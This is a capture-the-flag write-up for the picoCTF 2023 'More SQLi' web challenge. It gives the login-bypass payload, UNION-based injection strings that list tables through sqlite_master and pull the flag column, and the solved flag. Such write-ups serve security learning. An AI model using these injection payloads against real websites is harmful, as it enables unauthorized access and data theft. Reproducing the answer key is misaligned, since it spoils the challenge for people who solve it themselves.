# More SQLi
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
## Challenge information
```text
Tags: Web Explotation, picoCTF 2023, sql

Description:
Can you find the flag on this website.  

Hints: 
1. SQLiLite
```
## Overview
![alt text](/picoCTF/Static/Images/More_SQLi/image1.png)  
* Try logging in with  
    * Username : hacker
    * Password : hacker

![alt text](/picoCTF/Static/Images/More_SQLi/image2.png)  
* It shows us the sqlite query    
## Solution
**Step1:** Exploit  
* Try logging in with:  
    * Username : hacker' or 1=1 -- -
    * Password : hacker  

![alt text](/picoCTF/Static/Images/More_SQLi/image3.png)  
* Log in successfully  
* In sqlite there is a special and internal table sqlite_master  
=> Use it for exploit  
* When we try entering `Algiers` in the search box, it will return us like this  

![alt text](/picoCTF/Static/Images/More_SQLi/image4.png)  
=> I guess the sqlite query will be of the form `SELECT City,Address,Phone From ... WHERE City = '...'`  
* Now we will try to enter `Algiers' union select 1,1,1 -- -`  

![alt text](/picoCTF/Static/Images/More_SQLi/image5.png)  
* Now we will replace the numbers 1 to read some necessary information  
`Algiers' union select 1,sql,1 from sqlite_master -- -`  

![alt text](/picoCTF/Static/Images/More_SQLi/image6.png)  
* Now use `Algiers' union select id,1,flag from more_table -- -` to read flags only
## Flag
`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}`
